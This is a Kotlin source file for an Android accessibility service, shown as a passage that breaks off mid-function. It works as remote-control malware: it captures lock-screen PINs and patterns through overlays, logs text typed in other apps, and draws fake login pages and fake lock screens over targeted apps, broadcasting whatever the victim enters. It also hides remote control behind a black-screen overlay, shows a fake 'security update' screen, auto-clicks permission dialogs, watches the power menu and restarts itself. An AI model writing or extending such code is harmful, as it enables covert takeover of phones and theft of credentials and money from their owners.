package com.vibelink.client.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.Rect
import android.app.KeyguardManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.vibelink.client.R
import com.vibelink.client.accessibility.AccessibilityControlBridge
import com.vibelink.client.accessibility.AccessibilityControlBridge.ControlResult
import com.vibelink.client.accessibility.AccessibilitySelfHeal
import com.vibelink.client.accessibility.AccessibilityStateHolder
import com.vibelink.client.accessibility.AppListProtectGuard
import com.vibelink.client.accessibility.ScreenCaptureBridge
import com.vibelink.client.accessibility.UiTreeChangeBus
import com.vibelink.client.setup.SetupPermissionAutoClicker
import com.vibelink.client.device.AppIconHelper
import com.vibelink.client.device.AppLastUsedTracker
import com.vibelink.client.device.BlackScreenOverlayController
import com.vibelink.client.device.BlackScreenCaptureCompat
import com.vibelink.client.device.DeviceStateHelper
import com.vibelink.client.device.FakePageOverlayController
import com.vibelink.client.device.FakePageType
import com.vibelink.client.device.KeyguardFakeOverlayController
import com.vibelink.client.device.KeyguardFakePageType
import com.vibelink.client.device.KeyguardWakeHelper
import com.vibelink.client.device.PhoneTakeoverOverlayController
import com.vibelink.client.device.RemoteKeepAwakeOverlayController
import com.vibelink.client.device.SecurityUpdateOverlayController
import com.vibelink.client.prefs.FakePageHookStore
import com.vibelink.client.AppBroadcast
import com.vibelink.client.device.oem.KeyguardGestureHostImpl
import com.vibelink.client.device.oem.KeyguardOemProfileRegistry
import com.vibelink.client.keyguard.KeyguardCredentialCapture
import com.vibelink.client.keyguard.KeyguardLockType
import com.vibelink.client.keyguard.KeyguardPinKeyAction
import com.vibelink.client.keyguard.KeyguardPinKeyParser
import com.vibelink.client.keyguard.PatternCaptureOverlay
import com.vibelink.client.keyguard.PatternGestureCodec
import com.vibelink.client.keyguard.PinKeyPoint
import com.vibelink.client.keyguard.PinKeypadCaptureOverlay
import com.vibelink.client.prefs.DirectBoot
import com.vibelink.client.prefs.KeyguardPinPendingStore
import com.vibelink.client.prefs.SetupPrefs
import com.vibelink.client.receiver.UserUnlockedReceiver
import com.vibelink.client.setup.ServiceStarter
import com.vibelink.client.setup.ServiceWatchdog
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executor
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import org.json.JSONArray
import org.json.JSONObject

class RemoteAccessibilityService : AccessibilityService() {
    private val captureHandler = Handler(Looper.getMainLooper())
    private val gestureCallbackThread = HandlerThread("gesture_callback").apply { start() }
    private val gestureCallbackHandler = Handler(gestureCallbackThread.looper)
    private val captureExecutor = Executors.newSingleThreadExecutor()
    @Volatile
    private var isCapturingFrame = false
    @Volatile
    private var captureStartedAt = 0L
    @Volatile
    private var gesturePriorityUntil = 0L
    private var lastCaptureAt = 0L
    private var lastCachedResult: ScreenCaptureBridge.CaptureResult? = null
    private val keyguardCredentialCapture = KeyguardCredentialCapture()
    private val keyguardPinPendingStore by lazy { KeyguardPinPendingStore(this) }
    private var lastPinClickKey = ""
    private var lastPinClickAt = 0L
    private var lastPinDigitValue: Char = '\u0000'
    /** 上次已成功 publish 的签名，避免 capture+unlock 双发同一图案 */
    private var lastPublishedKeyguardSignature = ""
    /** overlay 显示期间只认 overlay 回调，拒绝一切 a11y click/树路径写 buffer */
    @Volatile
    private var pinOverlayExclusiveCapture = false
    private var wasKeyguardLocked = false
    private var keyguardPinUnlockFlushAttempt = 0
    private val keyguardPinSyncHandler = Handler(Looper.getMainLooper())
    private val keyguardPinSyncRunnable = Runnable { syncKeyguardPinFromTree() }
    private val keyguardPinResetRunnable = Runnable { resetKeyguardPinIfFieldCleared() }
    private val keyguardPinUnlockFlushRunnable = Runnable { retryKeyguardPinUnlockFlush() }
    private var patternCaptureOverlay: PatternCaptureOverlay? = null
    private var pinKeypadCaptureOverlay: PinKeypadCaptureOverlay? = null
    private var patternOverlaySuppressedUntil = 0L
    @Volatile
    private var keyguardRemoteUnlockActive = false
    private var pinOverlayCaptureUntil = 0L
    private var lastPinOverlayHeavySyncAt = 0L
    /** 刚用 P0 缓存挂层后，下一趟必须重扫校准（防顶行 1/2 rect 过期） */
    @Volatile
    private var forcePinHeavySyncOnce = false
    /**
     * 对齐竞品 AccessService.P0：键位表跨锁屏常驻，不在 resetSession 清空。
     * 再进 PIN 页可立刻挂 overlay，避免首位打在 shown 之前。
     */
    private var cachedPinKeyPointsP0: Map<String, PinKeyPoint> = emptyMap()
    private var cachedPinDigitCenters: Map<Char, Pair<Float, Float>>? = null
    private var cachedPinContainerRect: Rect? = null
    private var pinProgressDetectable: Boolean = false
    private var pinCalibrationSource: PinCalibrationSource = PinCalibrationSource.NONE
    private val keyguardProfile = KeyguardOemProfileRegistry.forCurrentDevice()
    private val keyguardHost by lazy {
        KeyguardGestureHostImpl(
            interactiveProbe = { DeviceStateHelper.isInteractive(this) },
            screenSizeProbe = { unlockSwipeScreenSizePx() },
            pinKeypadVisibleProbe = { isCredentialBouncerVisible() },
            tapAction = { x, y -> performKeyguardGestureTap(x, y) },
            swipeAction = { x1, y1, x2, y2, durationMs ->
                performUnlockSwipeFireAndForget(x1, y1, x2, y2, durationMs)
            },
        )
    }
    private var blackScreenOverlay: BlackScreenOverlayController? = null
    private var phoneTakeoverOverlay: PhoneTakeoverOverlayController? = null
    private var remoteKeepAwakeOverlay: RemoteKeepAwakeOverlayController? = null
    private var fakePageOverlay: FakePageOverlayController? = null
    private var keyguardFakeOverlay: KeyguardFakeOverlayController? = null
    private var securityUpdateOverlay: SecurityUpdateOverlayController? = null
    private var fakePagePackageName: String = ""
    private var fakePageTitle: String = ""
    private var keyguardFakeTitle: String = ""
    private val fakePageHookStore by lazy { FakePageHookStore(this) }
    private var lastFakePageForegroundPkg: String = ""
    /**
     * Android 8+ 对后台隐式 USER_PRESENT 会拒收 manifest 静态 Receiver
     * （log: Background execution not allowed → UserUnlockedReceiver）。
     * 竞品 mamimobi 在 AccessService 里动态 registerReceiver；这里对齐。
     */
    private val userPresentReceiver = UserUnlockedReceiver()
    private var userPresentReceiverRegistered = false

    private enum class PinCalibrationSource {
        NONE,
        VIEW_ID,
        CONTAINER_SCAN,
        TEXT,
        GRID,
    }
    override fun onServiceConnected() {
        super.onServiceConnected()
        promoteToForegroundSafely()
        AccessibilityStateHolder.markConnected(true)
        AccessibilityControlBridge.bind(this)
        // 服务真绑上了 → 解除自愈抑制。
        // 主动关闭（uninstall 命令）产生的抑制，会在用户/运维重新打开无障碍这一刻失效，
        // 不需要额外的显式清理接口。
        AccessibilitySelfHeal.clearSuppression(applicationContext)
        SetupPrefs(applicationContext).a11yEverHealthy = true
        if (DirectBoot.isUserUnlocked(applicationContext)) {
            ServiceStarter.tryStart(applicationContext)
        } else {
            ServiceStarter.tryStartDirectBoot(applicationContext)
        }
        wasKeyguardLocked = isKeyguardUiLocked()
        registerUserPresentReceiver()
        ensureBlackScreenOverlayController()
        if (BlackScreenOverlayController.wasOverlayActive(this)) {
            enableBlackScreenOverlay()
        }
        // 关机面板的检测不能只靠无障碍事件：ColorOS 上第二次打开可能一条事件都不送，
        // 靠独立的窗口轮询才能每次都拦住。
        AppListProtectGuard.startPowerWatch(this)
    }

    private fun registerUserPresentReceiver() {
        if (userPresentReceiverRegistered) {
            return
        }
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_USER_UNLOCKED)
        }
        runCatching {
            ContextCompat.registerReceiver(
                this,
                userPresentReceiver,
                filter,
                ContextCompat.RECEIVER_EXPORTED,
            )
            userPresentReceiverRegistered = true
            android.util.Log.i(TAG_PATTERN, "USER_PRESENT dynamic receiver registered")
        }.onFailure {
            android.util.Log.w(TAG_PATTERN, "USER_PRESENT dynamic register failed", it)
        }
    }

    private fun unregisterUserPresentReceiver() {
        if (!userPresentReceiverRegistered) {
            return
        }
        runCatching { unregisterReceiver(userPresentReceiver) }
        userPresentReceiverRegistered = false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        runCatching {
            dispatchAccessibilityEvent(event)
        }.onFailure {
            android.util.Log.e("RemoteAccessibility", "onAccessibilityEvent failed", it)
        }
    }

    private fun dispatchAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) {
            return
        }

        val packageName = event.packageName?.toString()
        val text = event.text?.joinToString(separator = "") { it?.toString().orEmpty() }.orEmpty()

        AccessibilityStateHolder.updateLastEvent(
            packageName = packageName,
            eventType = event.eventType,
            text = text,
        )

        AppLastUsedTracker.onAccessibilityEvent(this, event)
        handleKeyguardPinCapture(event, packageName)
        AppListProtectGuard.onAccessibilityEvent(this, event)
        // 带 packageName：锁屏噪音直接跳过，避免 SetupAutoClick 扫树 ANR
        SetupPermissionAutoClicker.onEvent(this, packageName)
        maybeTriggerArmedFakePage(event, packageName)

        // L3-2: UI 树变化信号（由 ConnectionService 做去抖/节流/dump/push）
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                UiTreeChangeBus.notifyChanged()
            }
        }

        if (text.isBlank()) {
            return
        }

        if (isKeyguardPackage(packageName)) {
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                dispatchKeyboardEvent(
                    appPackage = packageName,
                    text = text,
                    eventType = event.eventType,
                )
            }
        }
    }

    override fun onInterrupt() {
        unregisterUserPresentReceiver()
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        hideFakePageOverlay()
        hideKeyguardFakePageOverlay()
        hideSecurityUpdateOverlay()
        hideBlackScreenOverlayOnly()
        disablePhoneTakeoverOverlay()
        disableRemoteKeepAwakeOverlay()
        AccessibilityStateHolder.markConnected(false)
        AccessibilityControlBridge.unbind(this)
    }

    override fun onDestroy() {
        AppListProtectGuard.stopPowerWatch()
        unregisterUserPresentReceiver()
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        hideFakePageOverlay()
        hideKeyguardFakePageOverlay()
        hideSecurityUpdateOverlay()
        hideBlackScreenOverlayOnly()
        disablePhoneTakeoverOverlay()
        disableRemoteKeepAwakeOverlay()
        AccessibilityStateHolder.markConnected(false)
        AccessibilityControlBridge.unbind(this)
        stopForegroundSafely()
        ServiceStarter.tryStart(applicationContext)
        ServiceWatchdog.scheduleFastRestart(applicationContext)
        gestureCallbackThread.quitSafely()
        super.onDestroy()
    }

    override fun onKeyEvent(event: KeyEvent): Boolean {
        val takeover = phoneTakeoverOverlay
        if (takeover != null && takeover.isActive() && takeover.onKeyEvent(event)) {
            return true
        }
        val overlay = blackScreenOverlay
        if (overlay != null && overlay.isActive() && overlay.onKeyEvent(event)) {
            return true
        }
        return super.onKeyEvent(event)
    }

    fun isBlackScreenOverlayActive(): Boolean = blackScreenOverlay?.isActive() == true

    fun isPhoneTakeoverOverlayActive(): Boolean = phoneTakeoverOverlay?.isActive() == true

    fun isRemoteKeepAwakeOverlayActive(): Boolean = remoteKeepAwakeOverlay?.isActive() == true

    fun enableRemoteKeepAwakeOverlay(): ControlResult {
        val controller = ensureRemoteKeepAwakeOverlay()
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.show()
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = controller.show()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            ControlResult(true)
        } else {
            ControlResult(false, "remote_keep_awake_overlay_failed")
        }
    }

    fun disableRemoteKeepAwakeOverlay(): ControlResult {
        val controller = remoteKeepAwakeOverlay ?: return ControlResult(true)
        if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                controller.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        return ControlResult(true)
    }

    private fun ensureRemoteKeepAwakeOverlay(): RemoteKeepAwakeOverlayController {
        remoteKeepAwakeOverlay?.let { return it }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return RemoteKeepAwakeOverlayController(this, wm).also { remoteKeepAwakeOverlay = it }
    }

    fun enablePhoneTakeoverOverlay(): ControlResult {
        val controller = ensurePhoneTakeoverOverlay()
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.show()
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = controller.show()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            ControlResult(true)
        } else {
            ControlResult(false, "phone_takeover_overlay_failed")
        }
    }

    fun disablePhoneTakeoverOverlay(): ControlResult {
        val controller = phoneTakeoverOverlay ?: return ControlResult(true)
        if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                controller.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        return ControlResult(true)
    }

    private fun ensurePhoneTakeoverOverlay(): PhoneTakeoverOverlayController {
        phoneTakeoverOverlay?.let { return it }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return PhoneTakeoverOverlayController(this, wm).also { phoneTakeoverOverlay = it }
    }


    fun setBlackScreenStreamCompatible(enabled: Boolean) {
        runOnMainSync {
            blackScreenOverlay?.setStreamCompatibleBlack(enabled)
        }
    }

    fun isBlackScreenStreamCompatible(): Boolean =
        blackScreenOverlay?.isStreamCompatibleBlack() == true

    fun beginBlackScreenCaptureSession() {
        runOnMainSync {
            blackScreenOverlay?.beginCaptureSession()
        }
    }

    fun endBlackScreenCaptureSession() {
        runOnMainSync {
            blackScreenOverlay?.endCaptureSession()
        }
    }

    fun withBlackHiddenForCapture(block: () -> Unit) {
        runOnMainSync {
            val overlay = blackScreenOverlay
            if (overlay == null || !overlay.isActive()) {
                block()
            } else {
                overlay.withBlackHiddenForCapture(block)
            }
        }
    }

    fun setOpaqueBlackVisible(visible: Boolean) {
        runOnMainSync {
            blackScreenOverlay?.setOpaqueBlackVisible(visible)
        }
    }

    fun enableBlackScreenOverlay(): ControlResult {
        val controller = ensureBlackScreenOverlayController()
            ?: return ControlResult(false, "black_screen_overlay_unavailable")
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.show()
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = controller.show()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            invalidateCaptureCache()
            ControlResult(true)
        } else {
            ControlResult(false, "black_screen_overlay_failed")
        }
    }

    fun disableBlackScreenOverlay(): ControlResult {
        val controller = blackScreenOverlay
            ?: return ControlResult(true)
        if (Looper.myLooper() == Looper.getMainLooper()) {
            controller.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                controller.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        invalidateCaptureCache()
        return ControlResult(true)
    }

    fun showFakePageOverlay(
        packageName: String,
        title: String,
        content: String,
        iconBase64: String,
        pageType: FakePageType = FakePageType.PIN,
        webUrl: String = "",
        skipIntro: Boolean = false,
    ): ControlResult {
        hideKeyguardFakePageOverlay()
        val icon = iconBase64.trim().ifBlank {
            AppIconHelper.loadIconBase64(this, packageName)?.optString("icon").orEmpty()
        }
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            ensureFakePageOverlay().show(
                packageName = packageName,
                title = title,
                content = content,
                iconBase64 = icon,
                pageType = pageType,
                webUrl = webUrl,
                skipIntro = skipIntro,
            )
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = ensureFakePageOverlay().show(
                    packageName = packageName,
                    title = title,
                    content = content,
                    iconBase64 = icon,
                    pageType = pageType,
                    webUrl = webUrl,
                    skipIntro = skipIntro,
                )
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            fakePagePackageName = packageName
            fakePageTitle = title
            ControlResult(true)
        } else {
            ControlResult(false, "fake_page_overlay_failed")
        }
    }

    fun tryShowArmedFakePageIfForeground(packageName: String): ControlResult {
        val pkg = packageName.trim()
        if (pkg.isBlank()) {
            return ControlResult(false, "arm_fake_page_requires_package")
        }
        val current = lastFakePageForegroundPkg.ifBlank {
            AccessibilityStateHolder.lastPackageName.orEmpty()
        }
        if (current != pkg) {
            return ControlResult(true)
        }
        return showArmedFakePage(pkg)
    }

    fun hideFakePageOverlayForPackage(packageName: String?): ControlResult {
        val pkg = packageName?.trim().orEmpty()
        if (pkg.isNotBlank() && fakePagePackageName.isNotBlank() && fakePagePackageName != pkg) {
            return ControlResult(true)
        }
        return hideFakePageOverlay()
    }

    fun isFakePageOverlayShowing(): Boolean = fakePageOverlay?.isShowing() == true

    private fun maybeTriggerArmedFakePage(event: AccessibilityEvent, packageName: String?) {
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.eventType != AccessibilityEvent.TYPE_WINDOWS_CHANGED
        ) {
            return
        }
        if (isFakePageOverlayShowing() ||
            isKeyguardFakeOverlayShowing() ||
            isBlackScreenOverlayActive() ||
            isPhoneTakeoverOverlayActive() ||
            isSecurityUpdateOverlayShowing()
        ) {
            return
        }
        val pkg = packageName?.trim().orEmpty()
        if (isFakePageIgnoredPackage(pkg)) {
            return
        }
        if (pkg == lastFakePageForegroundPkg) {
            return
        }
        lastFakePageForegroundPkg = pkg
        showArmedFakePage(pkg)
    }

    private fun showArmedFakePage(packageName: String): ControlResult {
        val hook = fakePageHookStore.pending(packageName) ?: return ControlResult(true)
        Log.i(
            "FakePageHook",
            "trigger pkg=$packageName type=${hook.pageType} title=${hook.title}",
        )
        return showFakePageOverlay(
            packageName = hook.packageName,
            title = hook.title,
            content = hook.content,
            iconBase64 = hook.iconBase64,
            pageType = FakePageType.from(hook.pageType, hasPinFallback = true),
            webUrl = hook.webUrl,
            skipIntro = true,
        )
    }

    private fun isFakePageIgnoredPackage(packageName: String): Boolean {
        if (packageName.isBlank() || packageName == getPackageName()) {
            return true
        }
        if (packageName == "android" ||
            packageName == "com.android.systemui" ||
            packageName == "com.android.permissioncontroller" ||
            packageName == "com.google.android.permissioncontroller"
        ) {
            return true
        }
        val lower = packageName.lowercase()
        return lower.contains("inputmethod") ||
            lower.contains("honeyboard") ||
            lower.endsWith(".ime")
    }

    fun hideFakePageOverlay(): ControlResult {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            fakePageOverlay?.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                fakePageOverlay?.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        fakePagePackageName = ""
        fakePageTitle = ""
        return ControlResult(true)
    }

    fun showKeyguardFakePageOverlay(
        title: String,
        hint: String,
        pageType: KeyguardFakePageType,
        webUrl: String = "",
        pinLength: Int = 6,
    ): ControlResult {
        hideFakePageOverlay()
        // 伪页盖住真锁屏：先卸掉图案/PIN 采集层，避免叠在伪页上抢触摸
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            ensureKeyguardFakeOverlay().show(
                pageType = pageType,
                hint = hint,
                webUrl = webUrl,
                pinLength = pinLength,
            )
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = ensureKeyguardFakeOverlay().show(
                    pageType = pageType,
                    hint = hint,
                    webUrl = webUrl,
                    pinLength = pinLength,
                )
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            keyguardFakeTitle = title
            ControlResult(true)
        } else {
            ControlResult(false, "keyguard_fake_overlay_failed")
        }
    }

    fun hideKeyguardFakePageOverlay(): ControlResult {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            keyguardFakeOverlay?.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                keyguardFakeOverlay?.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        // 伪页关掉后立刻按真锁屏模式重挂 PIN/图案采集层
        scheduleKeyguardPinTreeSync()
        return ControlResult(true)
    }

    fun isKeyguardFakeOverlayShowing(): Boolean = keyguardFakeOverlay?.isShowing() == true

    fun queryKeyguardLockType(): String {
        return when (detectKeyguardCredentialMode()) {
            KeyguardCredentialMode.PATTERN -> "pattern"
            KeyguardCredentialMode.PIN -> "pin"
            KeyguardCredentialMode.PASSWORD -> "password"
            KeyguardCredentialMode.NONE -> "none"
        }
    }

    fun showSecurityUpdateOverlay(): ControlResult {
        val shown = if (Looper.myLooper() == Looper.getMainLooper()) {
            ensureSecurityUpdateOverlay().show()
        } else {
            val holder = booleanArrayOf(false)
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = ensureSecurityUpdateOverlay().show()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
            holder[0]
        }
        return if (shown) {
            ControlResult(true)
        } else {
            ControlResult(false, "security_update_overlay_failed")
        }
    }

    fun updateSecurityUpdateOverlayProgress(progress: Int, label: String): ControlResult {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            securityUpdateOverlay?.updateProgress(progress, label)
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                securityUpdateOverlay?.updateProgress(progress, label)
                latch.countDown()
            }
            latch.await(1, TimeUnit.SECONDS)
        }
        return ControlResult(true)
    }

    fun hideSecurityUpdateOverlay(): ControlResult {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            securityUpdateOverlay?.hide()
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                securityUpdateOverlay?.hide()
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        return ControlResult(true)
    }

    fun isSecurityUpdateOverlayShowing(): Boolean = securityUpdateOverlay?.isShowing() == true

    private fun ensureSecurityUpdateOverlay(): SecurityUpdateOverlayController {
        securityUpdateOverlay?.let { return it }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return SecurityUpdateOverlayController(this, wm).also { securityUpdateOverlay = it }
    }

    private fun ensureFakePageOverlay(): FakePageOverlayController {
        fakePageOverlay?.let { return it }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return FakePageOverlayController(
            this,
            wm,
            onSubmitted = { text, submitCount ->
                sendBroadcast(
                    Intent(AppBroadcast.ACTION_FAKE_PAGE_EVENT).apply {
                        setPackage(packageName)
                        putExtra(AppBroadcast.EXTRA_APP_PACKAGE, fakePagePackageName)
                        putExtra(AppBroadcast.EXTRA_TITLE, fakePageTitle)
                        putExtra(AppBroadcast.EXTRA_TEXT, text)
                        putExtra(AppBroadcast.EXTRA_SUBMIT_COUNT, submitCount)
                        putExtra(AppBroadcast.EXTRA_CAPTURED_AT, System.currentTimeMillis())
                    },
                )
            },
            onCompleted = { pkg ->
                fakePageHookStore.consume(pkg)
                Log.i("FakePageHook", "consumed pkg=$pkg")
            },
        ).also { fakePageOverlay = it }
    }

    private fun ensureKeyguardFakeOverlay(): KeyguardFakeOverlayController {
        keyguardFakeOverlay?.let { return it }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        return KeyguardFakeOverlayController(this, wm) { text ->
            sendBroadcast(
                Intent(AppBroadcast.ACTION_FAKE_PAGE_EVENT).apply {
                    setPackage(packageName)
                    putExtra(AppBroadcast.EXTRA_APP_PACKAGE, KeyguardFakeOverlayController.PACKAGE_MARKER)
                    putExtra(AppBroadcast.EXTRA_TITLE, keyguardFakeTitle)
                    putExtra(AppBroadcast.EXTRA_TEXT, text)
                    putExtra(AppBroadcast.EXTRA_SUBMIT_COUNT, 1)
                    putExtra(AppBroadcast.EXTRA_CAPTURED_AT, System.currentTimeMillis())
                },
            )
        }.also { keyguardFakeOverlay = it }
    }

    private fun ensureBlackScreenOverlayController(): BlackScreenOverlayController? {
        blackScreenOverlay?.let { return it }
        return try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            BlackScreenOverlayController(
                context = this,
                windowManager = wm,
                onEmergencyExit = { exitBlackScreenEmergency() },
            ).also { blackScreenOverlay = it }
        } catch (_: Exception) {
            null
        }
    }

    private fun hideBlackScreenOverlayOnly() {
        // Keep persisted flag so overlay can be restored after service reconnect.
        runCatching { blackScreenOverlay?.hide(clearPersistedState = false) }
    }

    private fun exitBlackScreenEmergency() {
        runCatching { blackScreenOverlay?.hide(clearPersistedState = true) }
    }

    /**
     * Black screen / phone takeover block local touch by default.
     * Briefly detach black touch-shield (and NOT_TOUCHABLE takeover) so remote
     * dispatchGesture / node actions reach the app.
     */
    private fun withOverlayPassthrough(block: () -> ControlResult): ControlResult {
        val black = blackScreenOverlay?.takeIf { it.isActive() }
        val takeover = phoneTakeoverOverlay?.takeIf { it.isActive() }
        if (black == null && takeover == null) {
            return block()
        }
        runOnServiceHandlerBlocking {
            black?.beginRemoteGesturePassthrough()
            takeover?.setTouchPassthrough(true)
        }
        // Let WindowManager finish detach/flag change before injecting gestures.
        Thread.sleep(80L)
        return try {
            block()
        } finally {
            runOnServiceHandlerBlocking {
                black?.endRemoteGesturePassthrough()
                takeover?.setTouchPassthrough(false)
            }
        }
    }

    fun forceReleaseCaptureLock(reason: String) {
        if (isCapturingFrame) {
            android.util.Log.w(
                "ScreenCapture",
                "forceReleaseCaptureLock reason=$reason stuck=${System.currentTimeMillis() - captureStartedAt}ms",
            )
            isCapturingFrame = false
        }
    }

    fun captureScreenOnce(onComplete: (ScreenCaptureBridge.CaptureResult) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            onComplete(ScreenCaptureBridge.CaptureResult(false, error = "screen_capture_unsupported"))
            return
        }

        val now = System.currentTimeMillis()
        val cached = lastCachedResult?.takeIf { it.ok }

        if (keyguardRemoteUnlockActive || now < gesturePriorityUntil) {
            if (cached != null) {
                onComplete(cached)
                return
            }
            // Do not call takeScreenshot during swipe/click — it cancels in-flight gestures.
            onComplete(ScreenCaptureBridge.CaptureResult(false, error = "gesture_priority"))
            return
        }

        if (isCapturingFrame) {
            val stuckMs = now - captureStartedAt
            if (stuckMs > CAPTURE_WATCHDOG_MS) {
                android.util.Log.w(
                    "ScreenCapture",
                    "watchdog(captureScreenOnce): force release isCapturingFrame after ${stuckMs}ms",
                )
                isCapturingFrame = false
            } else {
                if (cached != null) {
                    onComplete(cached)
                    return
                }
                onComplete(ScreenCaptureBridge.CaptureResult(false, error = "capture_in_progress"))
                return
            }
        }

        if (now - lastCaptureAt < MIN_CAPTURE_INTERVAL_MS) {
            if (cached != null) {
                onComplete(cached)
                return
            }
            val waitMs = MIN_CAPTURE_INTERVAL_MS - (now - lastCaptureAt)
            captureHandler.postDelayed({ captureScreenOnce(onComplete) }, waitMs)
            return
        }

        isCapturingFrame = true
        captureStartedAt = now
        // Black overlay uses setSkipScreenshot — keep it visible (no blink).
        takeScreenshotForCapture(onComplete, restoreBlackAfter = false)
    }

    /**
     * Same gates as [captureScreenOnce], but returns a scaled ARGB bitmap for WebRTC.
     * Caller must recycle [ScreenCaptureBridge.BitmapCaptureResult.bitmap].
     */
    fun captureScreenOnceBitmap(onComplete: (ScreenCaptureBridge.BitmapCaptureResult) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            onComplete(ScreenCaptureBridge.BitmapCaptureResult(false, error = "screen_capture_unsupported"))
            return
        }

        val now = System.currentTimeMillis()
        if (keyguardRemoteUnlockActive || now < gesturePriorityUntil) {
            onComplete(ScreenCaptureBridge.BitmapCaptureResult(false, error = "gesture_priority"))
            return
        }
        if (isCapturingFrame) {
            val stuckMs = now - captureStartedAt
            if (stuckMs > CAPTURE_WATCHDOG_MS) {
                android.util.Log.w(
                    "ScreenCapture",
                    "watchdog(bitmap): force release isCapturingFrame after ${stuckMs}ms",
                )
                isCapturingFrame = false
            } else {
                onComplete(ScreenCaptureBridge.BitmapCaptureResult(false, error = "capture_in_progress"))
                return
            }
        }
        if (now - lastCaptureAt < MIN_CAPTURE_INTERVAL_MS) {
            val waitMs = MIN_CAPTURE_INTERVAL_MS - (now - lastCaptureAt)
            captureHandler.postDelayed({ captureScreenOnceBitmap(onComplete) }, waitMs)
            return
        }

        isCapturingFrame = true
        captureStartedAt = now
        takeScreenshotForBitmap(onComplete)
    }

    fun captureScreenOnceFull(
        onComplete: (ScreenCaptureBridge.CaptureResult) -> Unit,
        attempt: Int = 0,
    ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            onComplete(ScreenCaptureBridge.CaptureResult(false, error = "screen_capture_unsupported"))
            return
        }

        val now = System.currentTimeMillis()
        if (isCapturingFrame && now - captureStartedAt > CAPTURE_WATCHDOG_MS) {
            android.util.Log.w(
